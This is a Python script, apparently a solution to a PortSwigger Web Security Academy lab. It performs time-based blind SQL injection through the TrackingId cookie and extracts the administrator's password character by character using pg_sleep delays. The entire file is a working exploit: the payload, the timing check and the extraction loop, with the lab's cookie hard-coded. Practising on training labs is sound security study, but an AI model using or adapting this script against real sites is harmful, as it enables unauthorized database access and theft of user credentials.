import requests

# Target URL
url = 'https://0a72004e03d4e29b81937fb600af00a9.web-security-academy.net/filter?category=Tech+gifts'

# Character set for brute-force guessing
characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+"

# Cookie values (Modify if needed)
base_cookie = {
    'TrackingId': '71sPCf8d37ESUNjX',
    'session': 'OK1BWmrDQSZQG0AMHzrxl9nIUrsz3MDN'
}


def send_request(payload):
    """ Sends an HTTP request with the given SQL payload """
    try:
        # Copy and modify the cookie
        cookie = base_cookie.copy()
        cookie['TrackingId'] += payload

        # Send request
        r = requests.get(url, cookies=cookie, timeout=5)

        # Return True if delay is detected (time-based blind SQLi)
        return r.elapsed.total_seconds() > 2
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return False


def get_data(length):
    """ Extracts password using time-based SQL injection """
    temp = ""
    for i in range(1, length + 1):
        for char in characters:
            # Corrected SQL Injection Payload
            payload = f"'|| CASE WHEN (SUBSTRING(((SELECT password FROM users WHERE username='administrator')) FROM {i} FOR 1)) = '{char}' THEN pg_sleep(2) ELSE pg_sleep(0) END -- '"

            # Send request and check if delay is triggered
            if send_request(payload):
                temp += char
                print(f"Extracted so far: {temp}")
                break  # Move to next character
    return temp


print("Dumping data... please be patient!")
password = get_data(20)  # Adjust length based on expected password size
print(f"Got it! Password: {password}")
